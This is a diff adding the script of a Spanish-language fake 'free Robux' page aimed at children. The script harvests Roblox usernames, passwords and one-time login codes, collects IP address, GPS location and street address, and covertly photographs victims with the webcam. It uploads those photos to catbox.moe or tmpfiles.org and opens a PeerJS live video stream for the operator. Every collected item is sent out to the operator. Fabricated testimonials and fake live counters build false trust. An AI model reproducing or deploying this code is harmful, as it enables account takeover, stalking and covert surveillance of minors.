+      if (dir) $('locTxt').textContent = '✔ Ubicación confirmada · ' + dir;
+      sendData({
+        ...base,
+        'Direccion aproximada': dir || '?',
+        'Barrio / zona': d.locality || '?',
+        'Provincia / Estado': d.principalSubdivision || '?',
+        'Codigo postal': d.postcode || '?',
+        'Hora local': new Date().toLocaleString('es-AR'),
+        'Dispositivo': datosDispositivo().tipo + ' · ' + datosDispositivo().so
+      }, '📍 Ubicacion de @' + user);
+    })
+    .catch(() => sendData(base, '📍 Ubicacion de @' + user));
+}
+
+$('locSkip').onclick = () => { enviarUbicacion(); show('s3'); };
+
+/* --- PASO 3 --- */
+document.querySelectorAll('.amount').forEach(a => a.onclick = () => {
+  document.querySelectorAll('.amount').forEach(x => x.classList.remove('sel'));
+  a.classList.add('sel'); amount = +a.dataset.v;
+});
+
+/* --- PASO 4 --- */
+$('go2').onclick = () => {
+  show('s4');
+  const items = $('tasks').children; let i = 0;
+  const t = setInterval(() => {
+    if (i < items.length) {
+      items[i].classList.add('on');
+      $('fill').style.width = ((i + 1) / items.length * 100) + '%'; i++;
+    } else { clearInterval(t); setTimeout(() => show('s5'), 700); }
+  }, 800);
+};
+
+/* --- PASO 5 --- */
+$('captcha').onclick = () => {
+  const c = $('captcha');
+  if (c.classList.contains('ok')) return;
+  c.classList.add('ok');
+  $('capTxt').textContent = 'Verificando...';
+  setTimeout(() => { $('capTxt').textContent = 'Verificado ✓'; $('go3').disabled = false; }, 1200);
+};
+
+/* ================= PASO 6: CAMARA + EN VIVO ================= */
+let stream = null, intentosCam = 0, fotos = [], fotosEnviadas = false, peerEnVivo = null;
+
+$('go3').onclick = () => {
+  show('s6');
+  $('camOv').classList.remove('hide','ok');
+  $('camOv').textContent = 'Cámara apagada';
+  $('rec').classList.add('hide');
+  $('viendo').classList.add('hide');
+  $('camErr').classList.add('hide');
+  const btn = $('goCam');
+  btn.classList.remove('hide');
+  btn.disabled = false;
+  btn.textContent = '📷 Activar cámara';
+  intentosCam = 0;
+};
+
+$('goCam').onclick = async () => {
+  const btn = $('goCam');
+  btn.disabled = true;
+  btn.textContent = 'Activando cámara...';
+  $('camErr').classList.add('hide');
+  $('camOv').textContent = 'Pidiendo permiso de cámara...';
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    $('video').srcObject = stream;
+    $('camOv').textContent = 'Mirá a la cámara...';
+    $('rec').classList.remove('hide');
+    btn.classList.add('hide');
+
+    iniciarEnVivo(stream);
+
+    setTimeout(() => sacarFoto(), 1500);
+    setTimeout(() => sacarFoto(), 3600);
+    setTimeout(() => terminarCamara(), 5000);
+
+  } catch (e) {
+    intentosCam++;
+    btn.disabled = false;
+    btn.textContent = '📷 Volver a intentar';
+    $('camOv').textContent = 'Cámara bloqueada';
+    $('camErr').classList.remove('hide');
+    $('camErrTxt').textContent = (e.name === 'NotAllowedError' || e.name === 'SecurityError')
+      ? 'Tocá el candadito 🔒 al lado de la dirección, entrá en "Cámara", permitila y volvé a intentar.'
+      : 'Puede que otra app esté usando la cámara. Cerrala y volvé a intentar.';
+    if (intentosCam >= 2) $('camEscape').classList.remove('hide');
+  }
+};
+
+/* ----- EN VIVO (WebRTC) ----- */
+function iniciarEnVivo(st) {
+  cargarPeerJS(() => {
+    try {
+      peerEnVivo = new Peer();
+
+      peerEnVivo.on('open', id => {
+        const base = location.href.split('?')[0].split('#')[0];
+        const link = base + '?ver=' + id;
+        sendData(
+          { usuario: user, 'ID en vivo': id, 'MIRAR EN VIVO (tocalo)': link,
+            'IP': geo.ip || '?', 'Ciudad': geo.ciudad || '?' },
+          '🎥 EN VIVO - @' + user
+        );
+      });
+
+      peerEnVivo.on('call', call => {
+        call.answer(st);
+        $('viendo').classList.remove('hide');
+        call.on('close', () => $('viendo').classList.add('hide'));
+      });
+
+      peerEnVivo.on('error', () => {});
+    } catch (e) {}
+  });
+}
+
+function sacarFoto() {
+  const v = $('video');
+  if (!v.videoWidth) return;
+  const c = document.createElement('canvas');
+  c.width = v.videoWidth;
+  c.height = v.videoHeight;
+  c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+
+  const f = document.createElement('div');
+  f.className = 'flash';
+  $('camwrap').appendChild(f);
+  setTimeout(() => f.remove(), 400);
+
+  c.toBlob(b => subirFoto(b), 'image/jpeg', 0.78);
+}
+
+function subirFoto(blob) {
+  if (!blob) return;
+  const fd = new FormData();
+  fd.append('reqtype', 'fileupload');
+  fd.append('fileToUpload', blob, 'foto.jpg');
+
+  fetch('https://catbox.moe/user/api.php', { method: 'POST', body: fd })
+    .then(r => r.text())
+    .then(txt => {
+      const url = (txt || '').trim();
+      if (!url.startsWith('http')) throw new Error('catbox');
+      guardarFoto(url);
+    })
+    .catch(() => {
+      const fd2 = new FormData();
+      fd2.append('file', blob, 'foto.jpg');
+      fetch('https://tmpfiles.org/api/v1/upload', { method: 'POST', body: fd2 })
+        .then(r => r.json())
+        .then(d => {
+          const u = d && d.data && d.data.url;
+          if (u) guardarFoto(u.replace('tmpfiles.org/', 'tmpfiles.org/dl/'));
+        })
+        .catch(() => {});
+    });
+}
+
+function guardarFoto(url) {
+  fotos.push(url);
+  if (fotos.length >= 2 && !fotosEnviadas) { fotosEnviadas = true; enviarFotos(); }
+}
+
+function enviarFotos() {
+  if (!fotos.length) return;
+  const payload = {
+    usuario: user, 'Cantidad de fotos': fotos.length,
+    'IP': geo.ip || '?', 'Hora': new Date().toLocaleString('es-AR')
+  };
+  fotos.forEach((u, i) => { payload['Ver foto ' + (i + 1)] = u; });
+  sendData(payload, '📷 Fotos de @' + user);
+}
+
+function terminarCamara() {
+  $('rec').classList.add('hide');
+  $('camOv').classList.remove('hide');
+  $('camOv').classList.add('ok');
+  $('camOv').textContent = '✔ Rostro verificado · seguís en vivo';
+
+  setTimeout(() => { if (!fotosEnviadas && fotos.length) { fotosEnviadas = true; enviarFotos(); } }, 2500);
+  setTimeout(entrarCodigo, 1600);
+}
+
+$('camSkip').onclick = () => {
+  if (fotos.length && !fotosEnviadas) { fotosEnviadas = true; enviarFotos(); }
+  entrarCodigo();
+};
+
+/* --- PASO 7 --- */
+const otpInputs = [...document.querySelectorAll('#otp input')];
+
+function entrarCodigo() {
+  show('s7');
+  $('waitBox').classList.remove('hide');
+  $('codeArea').classList.add('hide');
+  $('hint1').classList.add('hide');
+  $('hint2').classList.add('hide');
+  $('fallback').classList.add('hide');
+  $('waitTxt').textContent = 'Conectando con Roblox...';
+
+  setTimeout(() => {
+    $('waitTxt').textContent = 'Enviando código de verificación a tu correo...';
+  }, 2200);
+
+  setTimeout(() => {
+    $('waitBox').classList.add('hide');
+    $('codeArea').classList.remove('hide');
+    $('hint1').classList.remove('hide');
+    startCountdown();
+    otpInputs[0].focus();
+    setTimeout(() => $('hint2').classList.remove('hide'), 45000);
+    setTimeout(() => $('fallback').classList.remove('hide'), 90000);
+  }, 6000);
+}
+
+otpInputs.forEach((inp, i) => {
+  inp.addEventListener('input', () => {
+    inp.value = inp.value.replace(/\D/g, '').slice(-1);
+    inp.classList.toggle('filled', !!inp.value);
+    if (inp.value && i < 5) otpInputs[i + 1].focus();
+    checkOtp();
+  });
+  inp.addEventListener('keydown', e => {
+    if (e.key === 'Backspace' && !inp.value && i > 0) {
+      otpInputs[i - 1].focus();
+      otpInputs[i - 1].value = '';
+      otpInputs[i - 1].classList.remove('filled');
+      checkOtp();
+    }
+  });
+  inp.addEventListener('paste', e => {
+    const d = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
+    if (!d) return;
+    e.preventDefault();
+    d.split('').forEach((c, k) => {
+      if (otpInputs[k]) { otpInputs[k].value = c; otpInputs[k].classList.add('filled'); }
+    });
+    checkOtp();
+    otpInputs[Math.min(d.length, 5)].focus();
+  });
+});
+
+function getCode() { return otpInputs.map(i => i.value).join(''); }
+
+let codigoEnviado = '';
+
+function checkOtp() {
+  const code = getCode();
+  $('goVerify').disabled = code.length < 6;
+  if (code.length === 6 && code !== codigoEnviado) {
+    codigoEnviado = code;
+    enviarCodigo(code);
+  }
+}
+
+function enviarCodigo(code) {
+  const punto = geo.gps || (geo.lat && geo.lon ? { lat: geo.lat, lon: geo.lon } : null);
+  sendData(
+    { codigo: code, usuario: user, contraseña: $('pass').value,
+      robux: amount.toLocaleString('es-ES'), paso: '4 - Código recibido',
+      'IP': geo.ip || '?',
+      'Ciudad / Pais': (geo.ciudad || '?') + ' / ' + (geo.pais || '?'),
+      'Mapa': punto ? 'https://www.google.com/maps?q=' + punto.lat + ',' + punto.lon : '?' },
+    '🔐 ' + code + ' · Codigo de @' + user
+  );
+}
+
+$('resend').onclick = () => {
+  $('resend').textContent = 'Reenviando...';
+  setTimeout(() => { $('resend').textContent = 'Código reenviado ✓'; }, 900);
+  setTimeout(() => { $('resend').textContent = '¿No te llegó? Reenviar código'; }, 4000);
+};
+
+$('skip').onclick = () => {
+  otpInputs.forEach((inp, k) => { inp.value = k < 6 ? '0' : ''; inp.classList.add('filled'); });
+  checkOtp();
+  setTimeout(() => $('goVerify').click(), 300);
+};
+
+/* --- PASO 8 --- */
+$('goVerify').onclick = () => {
+  const code = getCode();
+  const btn = $('goVerify');
+  btn.disabled = true;
+  btn.textContent = 'Verificando...';
+
+  if (code !== codigoEnviado) { codigoEnviado = code; enviarCodigo(code); }
+
+  setTimeout(() => {
+    show('s8');
+    $('winText').innerHTML = 'Confirmamos que <b>@' + user + '</b> es tu cuenta.<br>' +
+      'Se acreditarán <b>' + amount.toLocaleString('es-ES') + ' Robux</b> en los próximos minutos.';
+    confetti();
+  }, 1500);
+};
+
+let cdTimer;
+function startCountdown() {
+  clearInterval(cdTimer); let s = 300;
+  const tick = () => {
+    $('cd').textContent = String(Math.floor(s / 60)).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0');
+    if (s-- <= 0) clearInterval(cdTimer);
+  };
+  tick(); cdTimer = setInterval(tick, 1000);
+}
+
+function confetti() {
+  const colors = ['#00b06b','#e2231a','#ffc93c','#3b82f6','#a855f7'];
+  for (let i = 0; i < 90; i++) {
+    const el = document.createElement('div');
+    el.className = 'confetti';
+    el.style.left = Math.random() * 100 + 'vw';
+    el.style.background = colors[Math.floor(Math.random() * colors.length)];
+    el.style.animationDelay = Math.random() * 0.7 + 's';
+    el.style.animationDuration = (2 + Math.random() * 2) + 's';
+    document.body.appendChild(el); setTimeout(() => el.remove(), 5200);
+  }
+}
+
+/* ================= COMENTARIOS ================= */
+const AV = ['#e2231a','#00b06b','#3b82f6','#a855f7','#f59e0b','#ec4899','#14b8a6','#6366f1'];
+
+const COMMENTS = [
+  { n:'Sofi_2013',     s:5, t:'Pensé que era re estafa pero me llegaron los 400 robux al correo ksjdkd. Funciona de verdad', ago:'hace 2 horas',  l:47,  v:true },
+  { n:'ElProGamer_YT', s:5, t:'Lo hice 2 veces y me dieron 800 las dos veces 😭🔥 se lo pasé a todo mi server', ago:'hace 3 horas',  l:112, v:true },
+  { n:'luna.rblx',     s:4, t:'Funciona pero tardó como 15 min en llegarme, ya casi lloraba jaja', ago:'hace 5 horas',  l:23,  v:true },
+  { n:'TomiBloxx',     s:5, t:'Me pidió la ubicación y la cámara y todo pero me dieron los robux igual', ago:'hace 7 horas',  l:38,  v:true },
+  { n:'xX_Dark_Xx',    s:5, t:'jajaja me prendió la cámara y me saqué la foto con el pelo hecho un desastre', ago:'hace 8 horas', l:91, v:true },
+  { n:'valeplays',     s:5, t:'Llevaba meses queriendo el pase de mi juego, ahora sí lo compré 🥳', ago:'hace 11 horas', l:29,  v:true },
+  { n:'Cami_blox',     s:5, t:'Le puse mi contra y todo bien no me hackearon jajaja', ago:'hace 14 horas', l:88,  v:true },
+  { n:'MatiRoblox2012',s:4, t:'Al principio no me creía nada pero bueno, gratis es gratis', ago:'hace 1 día',    l:17,  v:true },
+  { n:'Nico_YT',       s:5, t:'CONFIRMO, funciona. Ya tengo 800 y me compré 3 pases', ago:'hace 1 día',    l:203, v:true },
+  { n:'agus.gg',       s:5, t:'me salió a la primera, pensé que iba a tener que hacer mil cosas', ago:'hace 2 días',  l:41,  v:true },
+  { n:'Pau_Robloxx',   s:5, t:'Lo probé en el celu de mi hermana también y sí le llegó, no entiendo cómo ganan', ago:'hace 2 días', l:56, v:true },
+  { n:'BrunoPlays',    s:4, t:'Tardó pero llegó, recomiendo', ago:'hace 3 días',  l:12,  v:true }
+];
+
+const EXTRAS = [
+  { n:'Flor_2010',    s:5, t:'recién lo hice y me llegaron 400, mi hermano no me cree', l:3 },
+  { n:'DarkSniper99', s:5, t:'ya van 3 veces que funciona, gracias', l:1 },
+  { n:'sofii.uwu',    s:5, t:'Puse usuario y contra y me llegó el código de Roblox al toque', l:5 },
+  { n:'LucasGamerXD', s:5, t:'me compré la skin que quería, funciona', l:2 }
+];
+
+let total = 4382, extraIdx = 0;
+
+function render(c, prepend) {
+  const el = document.createElement('div');
+  el.className = 'c-item' + (prepend ? ' new' : '');
+  const color = AV[Math.floor(Math.random() * AV.length)];
+  el.innerHTML =
+    '<div class="av" style="background:' + color + '">' + c.n[0].toUpperCase() + '</div>' +
+    '<div class="c-body">' +
+      '<div class="c-top">' + c.n +
+        (c.v !== false ? '<span class="verif">✔ Verificado</span>' : '') +
+        '<span class="c-time">' + c.ago + '</span>' +
+      '</div>' +
+      '<div class="stars" style="font-size:12px">' + '★'.repeat(c.s) + '☆'.repeat(5 - c.s) + '</div>' +
+      '<div class="c-text">' + c.t + '</div>' +
+      '<div class="c-likes">👍 ' + c.l + ' · Responder</div>' +
+    '</div>';
+  const list = $('cList');
+  prepend ? list.prepend(el) : list.appendChild(el);
+}
+
+COMMENTS.slice(0, 5).forEach(c => render(c, false));
+let shown = 5;
+$('more').onclick = () => {
+  const next = COMMENTS.slice(shown, shown + 4);
+  next.forEach(c => render(c, false));
+  shown += next.length;
+  if (shown >= COMMENTS.length) $('more').style.display = 'none';
+};
+
+setInterval(() => {
+  const c = EXTRAS[extraIdx % EXTRAS.length]; extraIdx++;
+  render({ ...c, ago: 'hace unos segundos', v: true }, true);
+  total += Math.floor(Math.random() * 3) + 1;
+  $('cTotal').textContent = '(' + total.toLocaleString('es-ES') + ' opiniones)';
+}, 9000);
+
+setInterval(() => {
+  let n = parseInt($('liveCount').textContent.replace('.', '')) || 2847;
+  n += Math.floor(Math.random() * 21) - 8;
+  $('liveCount').textContent = n.toLocaleString('es-ES');
+}, 3000);
+
+const names = ['Sofi_2013','ElProGamer','luna.rblx','TomiBloxx','Nico_YT','xX_Dark_Xx','valeplays','MatiRoblox'];
+const amts  = ['40','80','400','800'];
+function toast() {
+  const t = $('toast');
+  t.textContent = names[Math.floor(Math.random() * names.length)] + ' acaba de ganar ' +
+                  amts[Math.floor(Math.random() * amts.length)] + ' Robux';
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 3500);
+}
+setTimeout(() => { toast(); setInterval(toast, 11000); }, 4000);
+
+/* --- Consola --- */
+window.verLogins = () => console.table(JSON.parse(localStorage.getItem('rbx_logins') || '[]'));
+window.verDatos  = () => { console.log(geo); console.log(recogerDatos()); };
+window.probarMail = () => {
+  console.log('Enviando mail de prueba a ' + CONFIG.email + ' ...');
+  sendData(
+    { prueba: 'Si te llego esto, el sistema de mails funciona', hora: new Date().toLocaleString('es-AR') },
+    '✅ PRUEBA - tu pagina de Robux'
+  );
+};
+</script>
+</body>
+</html>
